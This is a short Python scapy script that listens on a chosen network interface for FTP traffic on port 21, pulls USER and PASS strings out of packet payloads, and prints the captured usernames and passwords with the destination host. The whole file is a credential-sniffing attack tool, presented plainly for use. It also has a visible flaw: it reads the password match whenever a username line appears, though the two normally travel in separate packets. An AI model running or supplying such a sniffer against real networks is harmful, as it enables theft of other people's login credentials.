#!/usr/bin/python

import argparse
from scapy.all import *


def ftp_sniff(pkt):
    dst = pkt.getlayer(scapy.IP).dst
    raw = pkt.sprintf("%Raw.load%")
    user = re.findall("(?i)USER (.*)", raw)
    pwd = re.findall("(?i)PASS (.*)", raw)
    if user:
        print(f"<> Detected FTP login: {str(dst)}")
        print(f"<> Username: {str(user[0]).strip('\r').strip('\n')}")
        print(f"<> Password: {str(pwd[0]).strip('\r').strip('\n')}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Usage: -i <interface>")
    parser.add_argument(
        "-i", "--interface", nargs="?", help="Specify interface to listen on"
    )
    var_args = vars(parser.parse_args())
    if var_args["interface"] == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = var_args["interface"]
    try:
        sniff(filter="tcp port 21", prn=ftp_sniff)
    except KeyboardInterrupt:
        exit(0)
